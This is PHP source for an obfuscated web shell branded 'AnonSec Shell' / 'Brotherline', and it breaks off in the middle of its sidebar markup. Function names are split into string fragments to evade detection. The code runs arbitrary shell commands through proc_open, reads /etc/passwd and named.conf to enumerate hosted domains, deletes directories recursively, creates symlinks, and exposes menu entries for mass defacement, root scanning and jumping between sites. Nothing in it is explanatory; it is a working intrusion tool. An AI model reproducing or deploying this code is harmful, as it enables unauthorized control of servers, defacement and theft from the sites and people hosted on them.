<!DOCTYPE html>
<html lang="en" id="html-root">
<head>
    <?php echo "<title>An"."onS"."ec Sh"."el"."l</title>"; ?>
    <meta name="robots" content="noindex">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        mono: ['JetBrains Mono', 'monospace'],
                        display: ['Syne', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <style>
        /* ── DARK THEME (default) ── */
        :root {
            --c-base:    #0d0d0f;
            --c-surface: #141416;
            --c-panel:   #1a1a1d;
            --c-border:  #2a2a2e;
            --c-muted:   #3a3a3f;
            --c-dim:     #6b6b75;
            --c-text:    #e2e2e8;
            --c-accent:  #f59e0b;
            --c-green:   #22c55e;
            --c-red:     #ef4444;
            --c-blue:    #3b82f6;
            --c-purple:  #a855f7;
            --c-row-hover: #1e1e22;
            --c-scrollbar-track: #0d0d0f;
            --c-scrollbar-thumb: #3a3a3f;
        }

        /* ── LIGHT THEME ── */
        html.light {
            --c-base:    #f4f4f5;
            --c-surface: #ffffff;
            --c-panel:   #f0f0f2;
            --c-border:  #d4d4d8;
            --c-muted:   #a1a1aa;
            --c-dim:     #71717a;
            --c-text:    #18181b;
            --c-accent:  #d97706;
            --c-green:   #16a34a;
            --c-red:     #dc2626;
            --c-blue:    #2563eb;
            --c-purple:  #9333ea;
            --c-row-hover: #e8e8ec;
            --c-scrollbar-track: #f4f4f5;
            --c-scrollbar-thumb: #d4d4d8;
        }

        * { box-sizing: border-box; }
        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--c-base);
            color: var(--c-text);
            transition: background 0.2s, color 0.2s;
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: var(--c-scrollbar-track); }
        ::-webkit-scrollbar-thumb { background: var(--c-scrollbar-thumb); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--c-dim); }

        /* File upload button */
        ::-webkit-file-upload-button {
            background: transparent; color: var(--c-text);
            border: 1px solid var(--c-muted); padding: 4px 10px; border-radius: 4px;
            cursor: pointer; font-family: 'JetBrains Mono', monospace; font-size: 12px;
        }
        ::-webkit-file-upload-button:hover { border-color: var(--c-accent); color: var(--c-accent); }

        /* Theme-aware utility classes */
        .t-base    { background: var(--c-base) !important; }
        .t-surface { background: var(--c-surface) !important; }
        .t-panel   { background: var(--c-panel) !important; }
        .t-border  { border-color: var(--c-border) !important; }
        .t-text    { color: var(--c-text) !important; }
        .t-dim     { color: var(--c-dim) !important; }
        .t-accent  { color: var(--c-accent) !important; }

        /* Row hover */
        .file-row:hover { background: var(--c-row-hover) !important; }
        .file-row:hover td { text-shadow: 0 0 8px rgba(245,158,11,0.2); }

        /* Breadcrumb separator */
        .breadcrumb-sep { color: var(--c-muted); margin: 0 4px; }

        /* Perm colors */
        .perm-write  { color: var(--c-green); }
        .perm-noread { color: var(--c-red); }
        .perm-normal { color: var(--c-dim); }

        /* Badges */
        .badge-on  { color: var(--c-green); }
        .badge-off { color: var(--c-red); }

        /* Icon buttons */
        .icon-btn {
            display: inline-flex; align-items: center; justify-content: center;
            width: 28px; height: 28px; border-radius: 6px;
            border: 1px solid var(--c-border); background: transparent;
            color: var(--c-dim); cursor: pointer; transition: all 0.15s;
        }
        .icon-btn:hover         { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.08); }
        .icon-btn.danger:hover  { border-color: var(--c-red);    color: var(--c-red);    background: rgba(239,68,68,0.08); }
        .icon-btn.safe:hover    { border-color: var(--c-green);  color: var(--c-green);  background: rgba(34,197,94,0.08); }

        /* Nav links */
        .nav-link {
            padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 600;
            border: 1px solid var(--c-border); color: var(--c-dim); background: transparent;
            text-decoration: none; transition: all 0.15s; letter-spacing: 0.05em;
            text-transform: uppercase; cursor: pointer;
        }
        .nav-link:hover  { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.08); }
        .nav-link.active { border-color: var(--c-accent); color: var(--c-accent); background: rgba(245,158,11,0.12); }

        /* Table */
        #file-table th { font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--c-dim); border-bottom: 1px solid var(--c-border); padding: 10px 12px; font-weight: 500; background: var(--c-surface); }
        #file-table td { padding: 8px 12px; border-bottom: 1px solid var(--c-border); font-size: 12px; color: var(--c-text); white-space: nowrap; }
        #file-table td:first-child { width: 35%; }
        #file-table .filename-cell { display: flex; align-items: center; gap: 8px; }
        #file-table .filename-cell a { color: var(--c-text); text-decoration: none; transition: color 0.1s; }
        #file-table .filename-cell a:hover { color: var(--c-accent); }
        #file-table tr { background: var(--c-base); }

        /* Section divider */
        .dir-divider td { background: var(--c-surface); color: var(--c-muted); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; padding: 4px 12px; }

        /* Input / Textarea / Select */
        .field {
            background: var(--c-base); border: 1px solid var(--c-border); color: var(--c-text);
            border-radius: 6px; padding: 7px 12px; font-family: 'JetBrains Mono', monospace;
            font-size: 12px; outline: none; transition: border-color 0.15s, background 0.2s;
            width: 100%;
        }
        .field:focus { border-color: var(--c-accent); }
        .field::placeholder { color: var(--c-muted); }
        select.field option { background: var(--c-base); }

        /* Submit btn */
        .submit-btn {
            background: transparent; border: 1px solid var(--c-accent); color: var(--c-accent);
            border-radius: 6px; padding: 7px 16px; font-family: 'JetBrains Mono', monospace;
            font-size: 12px; cursor: pointer; transition: all 0.15s; font-weight: 600;
        }
        .submit-btn:hover { background: rgba(245,158,11,0.12); }

        /* Alert */
        .alert { padding: 10px 16px; border-radius: 8px; font-size: 13px; margin-bottom: 12px; }
        .alert-success { background: rgba(34,197,94,0.1);  border: 1px solid rgba(34,197,94,0.3);  color: var(--c-green); }
        .alert-error   { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.3);  color: var(--c-red); }
        .alert-warn    { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); color: var(--c-accent); }

        /* Panel cards */
        .card { background: var(--c-surface); border: 1px solid var(--c-border); border-radius: 10px; padding: 20px; }

        /* Sidebar panels */
        .sidebar-panel { background: var(--c-surface); border-bottom: 1px solid var(--c-border); }

        /* Icon colors */
        .ico-folder { color: var(--c-accent); }
        .ico-file   { color: var(--c-dim); }
        .ico-zip    { color: var(--c-purple); }
        .ico-image  { color: var(--c-blue); }
        .ico-text   { color: var(--c-green); }
        .ico-pdf    { color: var(--c-red); }
        .ico-code   { color: var(--c-accent); }
        .ico-back   { color: var(--c-dim); }

        /* Accent line */
        .accent-line { height: 2px; background: linear-gradient(90deg, var(--c-accent), transparent); border-radius: 1px; }

        /* Theme toggle button */
        .theme-toggle {
            display: flex; align-items: center; gap: 6px;
            padding: 5px 12px; border-radius: 20px; cursor: pointer;
            border: 1px solid var(--c-border); background: var(--c-panel);
            color: var(--c-dim); font-size: 11px; font-family: 'JetBrains Mono', monospace;
            transition: all 0.2s; font-weight: 600; letter-spacing: 0.05em;
            text-transform: uppercase; flex-shrink: 0;
        }
        .theme-toggle:hover { border-color: var(--c-accent); color: var(--c-accent); }

        /* Terminal textarea */
        #term-output {
            background: var(--c-base); border: 1px solid var(--c-border);
            color: var(--c-text); border-radius: 8px; padding: 12px;
            font-family: 'JetBrains Mono', monospace; font-size: 12px;
            resize: vertical; min-height: 160px; width: 100%; outline: none;
            transition: border-color 0.15s, background 0.2s;
            line-height: 1.6;
        }
        #term-output:focus { border-color: var(--c-accent); }

        /* Brotherline branding */
        .brotherline-brand {
            font-family: 'Syne', sans-serif;
            font-weight: 800;
            letter-spacing: 0.12em;
            text-transform: uppercase;
            background: linear-gradient(90deg, var(--c-accent), #fb923c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* Header / Nav / Breadcrumb themed backgrounds */
        header, nav, .breadcrumb-bar {
            background: var(--c-surface);
            border-color: var(--c-border);
            transition: background 0.2s;
        }
        aside {
            background: var(--c-surface);
            border-color: var(--c-border);
            transition: background 0.2s;
        }
        main {
            background: var(--c-base);
            transition: background 0.2s;
        }
        .service-badge-on  { background: rgba(34,197,94,0.1);  border: 1px solid rgba(34,197,94,0.3);  color: var(--c-green); }
        .service-badge-off { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.3);  color: var(--c-red); }

        .info-pill { background: var(--c-panel); border: 1px solid var(--c-border); }

        /* Radio card */
        .radio-card {
            display: flex; align-items: center; gap: 8px; cursor: pointer;
            background: var(--c-base); border: 1px solid var(--c-border);
            border-radius: 8px; padding: 10px 12px;
            transition: border-color 0.15s;
        }
        .radio-card:hover { border-color: rgba(245,158,11,0.4); }

        /* Terminal input bar */
        .term-input-bar {
            display: flex; align-items: center;
            background: var(--c-base); border: 1px solid var(--c-border);
            border-radius: 8px; padding: 0 12px; gap: 8px;
            transition: border-color 0.15s, background 0.2s;
        }
        .term-input-bar:focus-within { border-color: var(--c-accent); }
        .term-input-bar input {
            background: transparent; flex: 1; font-size: 12px;
            color: var(--c-text); outline: none; font-family: 'JetBrains Mono', monospace;
            padding: 10px 0;
        }
    </style>
</head>

<script>
  (function() {
    var t = localStorage.getItem('bl-theme') || 'dark';
    if (t === 'light') document.documentElement.classList.add('light');
  })();
</script>

<body style="background:var(--c-base);color:var(--c-text);min-height:100vh;">
<?php
/* ============================================================
 *  BOOTSTRAP — obfuscated variable aliases (unchanged)
 * ============================================================ */
set_time_limit(0);
error_reporting(0);

$gcw  = "ge"."tc"."wd";
$exp  = "ex"."plo"."de";
$fpt  = "fi"."le_p"."ut_co"."nte"."nts";
$fgt  = "f"."ile_g"."et_c"."onten"."ts";
$sts  = "s"."trip"."slash"."es";
$scd  = "sc"."a"."nd"."ir";
$fxt  = "fi"."le_"."exis"."ts";
$idi  = "i"."s_d"."ir";
$ulk  = "un"."li"."nk";
$ifi  = "i"."s_fi"."le";
$sub  = "subs"."tr";
$spr  = "sp"."ri"."ntf";
$fp   = "fil"."epe"."rms";
$chm  = "ch"."m"."od";
$ocd  = "oc"."td"."ec";
$isw  = "i"."s_wr"."itab"."le";
$idr  = "i"."s_d"."ir";
$ird  = "is"."_rea"."da"."ble";
$isr  = "is_"."re"."adab"."le";
$fsz  = "fi"."lesi"."ze";
$rd   = "r"."ou"."nd";
$igt  = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad  = "RE"."M"."OTE_AD"."DR";
$rpt  = "re"."al"."pa"."th";
$bsn  = "ba"."se"."na"."me";
$srl  = "st"."r_r"."ep"."la"."ce";
$sps  = "st"."rp"."os";
$mkd  = "m"."kd"."ir";
$pma  = "pr"."eg_ma"."tch_"."al"."l";
$aru  = "ar"."ray_un"."ique";
$ctn  = "co"."unt";
$urd  = "ur"."ldeco"."de";
$pgw  = "pos"."ix_g"."etp"."wui"."d";
$fow  = "fi"."leow"."ner";
$tch  = "to"."uch";
$h2b  = "he"."x2"."bin";
$hsc  = "ht"."mlspe"."cialcha"."rs";
$ftm  = "fi"."lemti"."me";
$ars  = "ar"."ra"."y_sl"."ice";
$arr  = "ar"."ray_"."ra"."nd";
$fgr  = "fi"."legr"."oup";
$mdr  = "mkd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n'
    ? "ht"."tp"."s" : "ht"."tp") . "://" . $_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
$disf    = empty($disfunc)
    ? "<span class='badge-on'>NONE</span>"
    : "<span class='badge-off'>" . $disfunc . "</span>";

/* ============================================================
 *  HELPER FUNCTIONS (all logic unchanged)
 * ============================================================ */
function author() {
    echo '<div class="text-center py-6 text-dim text-xs font-mono">
        An'.'on7 &mdash; 2'.'022 &nbsp;&bull;&nbsp;
        <a href="https://sh'.'el'.'l.an'.'ons'.'ec-te'.'am.org/" target="_blank"
           class="text-accent hover:underline">An'.'on'.'Sec Te'.'am</a>
    </div>';
    exit();
}

function cdrd() {
    $lokasi = isset($_GET['loknya']) ? $_GET['loknya'] : ("ge"."t"."cw"."d")();
    $b = "i"."s_w"."ri"."tab"."le";
    return $b($lokasi)
        ? "<span class='badge-on'><i class='fa-solid fa-lock-open fa-xs mr-1'></i>Writable</span>"
        : "<span class='badge-off'><i class='fa-solid fa-lock fa-xs mr-1'></i>Read-only</span>";
}

function crt() {
    $a = "is"."_w"."ri"."tab"."le";
    return $a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])
        ? "<span class='badge-on'><i class='fa-solid fa-lock-open fa-xs mr-1'></i>Writable</span>"
        : "<span class='badge-off'><i class='fa-solid fa-lock fa-xs mr-1'></i>Read-only</span>";
}

function xrd($lokena) {
    $a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $b   = "is"."_di"."r";
        $loknya = $lokena . '/' . $item;
        if ($b($loknya)) { xrd($loknya); }
        else { $c = "u"."nl"."in"."k"; $c($loknya); }
    }
    $d = "rm"."di"."r"; $d($lokena);
}

function cfn($fl) {
    $a = "ba"."sena"."me";
    $b = "pat"."hinf"."o";
    $c = $b($a($fl), PATHINFO_EXTENSION);
    if ($c == "zip" || $c == "gz" || $c == "tar" || $c == "rar")
        return '<i class="fa-solid fa-file-zipper ico-zip"></i>';
    if (preg_match("/jpeg|jpg|png|gif|ico|webp|svg/im", $c))
        return '<i class="fa-solid fa-file-image ico-image"></i>';
    if ($c == "txt" || $c == "log" || $c == "md")
        return '<i class="fa-solid fa-file-lines ico-text"></i>';
    if ($c == "pdf")
        return '<i class="fa-solid fa-file-pdf ico-pdf"></i>';
    if ($c == "html" || $c == "htm" || $c == "css" || $c == "js" || $c == "php" || $c == "py" || $c == "sh")
        return '<i class="fa-solid fa-file-code ico-code"></i>';
    return '<i class="fa-solid fa-file ico-file"></i>';
}

function ipsrv() {
    $a = "g"."eth"."ost"."byna"."me";
    $b = "fun"."cti"."on_"."exis"."ts";
    $c = "S"."ERVE"."R_AD"."DR";
    $d = "SE"."RV"."ER_N"."AM"."E";
    return $b($a) ? $a($_SERVER[$d]) : $a($_SERVER[$c]);
}

function ggr($fl) {
    $a = "fun"."cti"."on_"."exis"."ts";
    $b = "po"."si"."x_ge"."tgr"."gid";
    $c = "fi"."le"."gro"."up";
    if ($a($b)) {
        if (!$a($c)) return "?";
        $d = $b($c($fl));
        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
        return $d['name'];
    } elseif ($a($c)) { return $c($fl); }
    return "?";
}

function gor($fl) {
    $a = "fun"."cti"."on_"."exis"."ts";
    $b = "po"."s"."ix_"."get"."pwu"."id";
    $c = "fi"."le"."o"."wn"."er";
    if ($a($b)) {
        if (!$a($c)) return "?";
        $d = $b($c($fl));
        if (empty($d)) { $e = $c($fl); return empty($e) ? "?" : $e; }
        return $d['name'];
    } elseif ($a($c)) { return $c($fl); }
    return "?";
}

function fdt($fl) {
    $a = "da"."te";
    $b = "fil"."emt"."ime";
    return $a("Y-m-d H:i", $b($fl));
}

function dunlut($fl) {
    $a = "fil"."e_exi"."sts";
    $b = "ba"."sena"."me";
    $c = "fi"."les"."ize";
    $d = "re"."ad"."fi"."le";
    if ($a($fl) && isset($fl)) {
        header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
        header("Conte'.'nt-Control:public");
        header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
        header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="' . $b($fl) . '"');
        header('Exp'.'ires: 0');
        header("Ex"."pired:0");
        header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
        header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
        header('Pra'.'gma: pub'.'lic');
        header('Con'.'ten'.'t-Le'.'ngth: ' . $c($fl));
        flush(); $d($fl); exit;
    } else { return "Fi"."le Not F"."ound !"; }
}

function komend($kom, $lk) {
    $x  = "pr"."eg_"."mat"."ch";
    $xx = "2".">"."&"."1";
    if (!$x("/" . $xx . "/i", $kom)) $kom = $kom . " " . $xx;
    $a = "fu"."ncti"."on_"."ex"."is"."ts";
    $b = "p"."ro"."c_op"."en";
    $c = "htm"."lspe"."cialc"."hars";
    $d = "s"."trea"."m_g"."et_c"."ont"."ents";
    if ($a($b)) {
        $ps = $b($kom, [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
        return "<pre class='text-xs text-text bg-surface border border-border rounded-lg p-4 mt-3 overflow-auto max-h-80'>"
             . $c($d($meki[1])) . "</pre>";
    }
    return "<span class='badge-off'>pr"."oc"."_op"."en disabled</span>";
}

function komenb($kom, $lk) {
    $x  = "pr"."eg_"."mat"."ch";
    $xx = "2".">"."&"."1";
    if (!$x("/" . $xx . "/i", $kom)) $kom = $kom . " " . $xx;
    $a = "fu"."ncti"."on_"."ex"."is"."ts";
    $b = "p"."ro"."c_op"."en";
    $d = "s"."trea"."m_g"."et_c"."ont"."ents";
    if ($a($b)) {
        $ps = $b($kom, [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
        return $d($meki[1]);
    }
    return "pr"."oc"."_op"."en disabled";
}

function gtd() {
    $a = "is_rea"."dable"; $b = "fi"."le_ge"."t_con"."ten"."ts";
    $c = "pr"."eg_ma"."tch_"."al"."l";  $d = "fil"."e_exi"."sts";
    $e = "sca"."ndi"."r";               $f = "co"."unt";
    $g = "arr"."ay_un"."ique";          $h = "sh"."el"."l_"."ex"."ec";
    $i = "pr"."eg_"."mat"."ch";
    if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
        $a = $b("/e"."tc"."/na"."me"."d.co"."nf");
        $c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
        $b = $b[1]; return $f($g($b)) . " Dom"."ains";
    } elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
        $a = $e("/v"."ar/"."nam"."ed"); return $f($a) . " Dom"."ains";
    } elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
        $a = $b("/e"."tc"."/p"."as"."sw"."d");
        if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
            $c("/\/vh"."os"."ts\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
        } else {
            $c("/\/ho"."me\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
        }
    } elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
        $a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
        if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
            $c("/\/vh"."os"."ts\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
        } else {
            $c("/\/ho"."me\/(.*?):/i", $a, $b); $b = $b[1]; return $f($g($b)) . " Dom"."ai"."ns";
        }
    } else { return "0 Domains"; }
}

function esyeem($tg, $lk) {
    $a = "fun"."cti"."on_e"."xis"."ts"; $b = "p"."ro"."c_op"."en";
    $c = "htm"."lspe"."cialc"."hars";   $d = "s"."trea"."m_g"."et_c"."ont"."ents";
    $e = "sy"."mli"."nk";
    if ($a("sy"."mli"."nk")) return $e($tg, $lk);
    elseif ($a("pr"."oc_op"."en")) {
        $ps = $b("l"."n -"."s " . $tg . " " . $lk,
            [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","r"]], $meki, $lk);
        return $c($d($meki[1]));
    }
    return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !";
}

function sds($sads, &$results = []) {
    $iwr = "is"."_wri"."tab"."le"; $ira = "is_r"."eada"."ble";
    $ph  = "pr"."eg_ma"."tch";     $sa  = "sc"."and"."ir";
    $rh  = "re"."alp"."ath";       $idr = "i"."s_d"."ir";
    if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads))
        return false;
    $files = $sa($sads);
    foreach ($files as $key => $value) {
        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
        if (!$idr($path)) { /* skip files */ }
        elseif ($value != "." && $value != "..") { sds($path, $results); $results[] = $path; }
    }
    return $results;
}

function crul($web) {
    $cr = "cu"."rl_set"."opt"; $cx = "cu"."rl_"."ex"."ec"; $ch = "cu"."rl_clo"."se";
    $ceha = curl_init();
    $cr($ceha, CURLOPT_URL, $web);
    $cr($ceha, CURLOPT_RETURNTRANSFER, 1);
    return $cx($ceha); $ch($ceha);
}

/* UI helpers */
function alertSuccess($msg) { echo "<div class='alert alert-success'><i class='fa-solid fa-circle-check mr-2'></i>{$msg}</div>"; }
function alertError($msg)   { echo "<div class='alert alert-error'><i class='fa-solid fa-circle-xmark mr-2'></i>{$msg}</div>"; }
function alertWarn($msg)    { echo "<div class='alert alert-warn'><i class='fa-solid fa-triangle-exclamation mr-2'></i>{$msg}</div>"; }

/* Legacy wrappers used in body (map old names → new helpers) */
function green($text) { alertSuccess($text); }
function red($text)   { alertError($text); }
function oren($text)  { return "<div class='alert alert-warn'>" . $text . "</div>"; }

function tuls($nm, $lk) {
    return "<a href='" . $lk . "' class='nav-link'>" . $nm . "</a>";
}

function statusnya($fl) {
    $a = "sub"."st"."r"; $b = "s"."pri"."ntf"; $c = "fil"."eper"."ms";
    return $a($b('%o', $c($fl)), -4);
}

/* ============================================================
 *  ROUTING — resolve current path
 * ============================================================ */
foreach ($_POST as $key => $value) { $_POST[$key] = $sts($value); }

if (isset($_GET['loknya'])) {
    $lokasi = $_GET['loknya'];
    $lokdua = $_GET['loknya'];
} else {
    $lokasi = $gcw();
    $lokdua = $gcw();
}

$lokasi    = $srl('\\', '/', $lokasi);
$lokasis   = $exp('/', $lokasi);
$lokasinya = @$scd($lokasi);

/* ============================================================
 *  TOP HEADER
 * ============================================================ */
?>
<div class="flex flex-col h-screen overflow-hidden">

  <!-- ── HEADER BAR ───────────────────────────────────────── -->
  <header class="flex-shrink-0 bg-surface border-b border-border px-5 py-3">
    <div class="flex items-center justify-between gap-4">

      <!-- Logo / Branding -->
      <div class="flex items-center gap-3 flex-shrink-0">
        <div class="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0"
             style="background: rgba(245,158,11,0.12); border: 1px solid rgba(245,158,11,0.3);">
          <i class="fa-solid fa-shield-halved" style="color: var(--c-accent); font-size: 15px;"></i>
        </div>
        <div class="flex flex-col leading-none">
          <span class="brotherline-brand text-base tracking-widest">Brotherline</span>
          <span style="font-size: 10px; color: var(--c-dim); letter-spacing: 0.1em; font-family: 'JetBrains Mono', monospace;">
            <?php echo "An"."on"."Se"."c &bull; Sh"."el"."l"; ?>
          </span>
        </div>
      </div>

      <!-- Server Info pills -->
      <div class="flex flex-wrap items-center gap-2 text-xs font-mono flex-1 min-w-0">
        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
          <i class="fa-solid fa-server text-xs" style="color:var(--c-accent)"></i>
          <span style="color:var(--c-dim)">SRV</span>
          <span style="color:var(--c-text)"><?php echo ipsrv(); ?></span>
        </span>
        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
          <i class="fa-solid fa-circle-user text-xs" style="color:var(--c-blue)"></i>
          <span style="color:var(--c-dim)">YOU</span>
          <span style="color:var(--c-text)"><?php echo $_SERVER[$rad]; ?></span>
        </span>
        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
          <i class="fa-solid fa-terminal text-xs" style="color:var(--c-purple)"></i>
          <?php
            $gcu = "g"."et_"."curr"."ent"."_us"."er";
            $gmu = "g"."et"."my"."ui"."d";
            echo '<span style="color:var(--c-dim)">USER</span><span style="color:var(--c-text)">&nbsp;' . @$gcu() . ' (' . @$gmu() . ')</span>';
          ?>
        </span>
        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
          <i class="fa-brands fa-php text-xs" style="color:var(--c-purple)"></i>
          <?php $phv = "ph"."pve"."rsi"."on"; echo '<span style="color:var(--c-text)">' . @$phv() . '</span>'; ?>
        </span>
        <span class="info-pill rounded px-2 py-1 flex items-center gap-1.5">
          <i class="fa-solid fa-globe text-xs" style="color:var(--c-blue)"></i>
          <span style="color:var(--c-dim)">DOMAINS</span>
          <span style="color:var(--c-text)"><?php echo (empty(gtd()) ? '0 Domains' : gtd()); ?></span>
        </span>
      </div>

      <!-- Service badges -->
      <div class="flex items-center gap-1.5 flex-shrink-0 text-xs font-mono flex-wrap">
        <?php
        $services = [
            ["MySQL",  $fnct("my"."sql_co"."nne"."ct")  ? true : false],
            ["cURL",   $fnct("cu"."rl"."_in"."it")      ? true : false],
            ["WGET",   $fxt("/"."us"."r/b"."in/w"."get") ? true : false],
            ["Perl",   $fxt("/u"."sr/b"."in"."/pe"."rl") ? true : false],
            ["Python", $fxt("/"."us"."r/b"."in/p"."ytho"."n2") ? true : false],
            ["Sudo",   $fxt("/"."us"."r/b"."in/s"."u"."d"."o") ? true : false],
        ];
        foreach ($services as $svc) {
            $cls = $svc[1] ? 'service-badge-on' : 'service-badge-off';
            $dot = $svc[1] ? 'background:var(--c-green)' : 'background:var(--c-red)';
            echo "<span class='rounded px-1.5 py-0.5 {$cls} flex items-center gap-1' style='border-radius:4px;'>
                    <span class='inline-block w-1.5 h-1.5 rounded-full' style='{$dot}'></span>
                    {$svc[0]}
                  </span>";
        }
        ?>

        <!-- Theme toggle -->
        <button class="theme-toggle ml-2" id="theme-toggle-btn" onclick="toggleTheme()" title="Toggle Dark/Light mode">
          <i class="fa-solid fa-moon" id="theme-icon" style="font-size:11px;color:var(--c-accent)"></i>
          <span id="theme-label">DARK</span>
        </button>
      </div>
    </div>

    <!-- Disable functions row -->
    <div class="mt-2 text-xs font-mono" style="color:var(--c-dim);">
      <span class="mr-1"><i class="fa-solid fa-ban text-xs mr-1"></i>Disabled:</span>
      <?php echo $disf; ?>
      &nbsp;&bull;&nbsp;
      <?php $unm = "ph"."p_u"."na"."me"; echo '<span style="color:var(--c-dim)">OS:</span> <span style="color:var(--c-text)">' . @$unm() . '</span>'; ?>
      &nbsp;&bull;&nbsp;
      <?php echo '<span class="text-dim">Webserver:</span> <span class="text-text">' . $_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'] . '</span>'; ?>
    </div>
  </header>

  <!-- ── NAV BAR ──────────────────────────────────────────── -->
  <nav class="flex-shrink-0 bg-panel border-b border-border px-5 py-2 flex items-center gap-2 flex-wrap">
    <?php
    echo tuls('<i class="fa-solid fa-house-chimney mr-1.5"></i>HOME', $_SERVER['SC'.'RIP'.'T_N'.'AME']);
    echo tuls('<i class="fa-solid fa-box-archive mr-1.5"></i>BACKUP', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=bekup");
    echo tuls('<i class="fa-solid fa-person-running mr-1.5"></i>JUMPING', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=lompat");
    echo tuls('<i class="fa-solid fa-skull-crossbones mr-1.5"></i>MASS DEFACE', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=mdf");
    echo tuls('<i class="fa-solid fa-magnifying-glass mr-1.5"></i>SCAN ROOT', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=scanr");
    echo tuls('<i class="fa-solid fa-link mr-1.5"></i>SYMLINK', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya=" . $lokasi . "&opsi=esyeem");
    echo tuls('<i class="fa-solid fa-network-wired mr-1.5"></i>REVERSE IP', $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?opsi=repip");
    ?>
  </nav>

  <!-- ── ADDRESS / BREADCRUMB BAR ─────────────────────────── -->
  <div class="breadcrumb-bar flex-shrink-0 border-b px-5 py-2 flex items-center gap-2 text-xs font-mono">
    <i class="fa-solid fa-folder-tree text-xs" style="color:var(--c-dim)"></i>
    <div class="flex items-center flex-wrap gap-0.5" style="color:var(--c-dim)">
      <?php
      foreach ($lokasis as $id => $lok) {
          if ($lok == '' && $id == 0) {
              echo '<a href="?loknya=/" style="color:var(--c-accent)" onmouseover="this.style.color=\'#fbbf24\'" onmouseout="this.style.color=\'var(--c-accent)\'">/</a>';
              continue;
          }
          if ($lok == '') continue;
          echo '<span class="breadcrumb-sep">/</span><a href="?loknya=';
          for ($i = 0; $i <= $id; $i++) {
              echo $lokasis[$i];
              if ($i != $id) echo "/";
          }
          echo '" style="color:var(--c-text)" onmouseover="this.style.color=\'var(--c-accent)\'" onmouseout="this.style.color=\'var(--c-text)\'">' . $lok . '</a>';
      }
      ?>
    </div>
  </div>

  <!-- ── MAIN AREA ─────────────────────────────────────────── -->
  <div class="flex flex-1 overflow-hidden">

    <!-- ── SIDEBAR (Upload + Command) ───────────────────────── -->
    <aside class="w-80 flex-shrink-0 flex flex-col overflow-y-auto" style="background:var(--c-surface);border-right:1px solid var(--c-border);">

      <!-- Upload panel -->
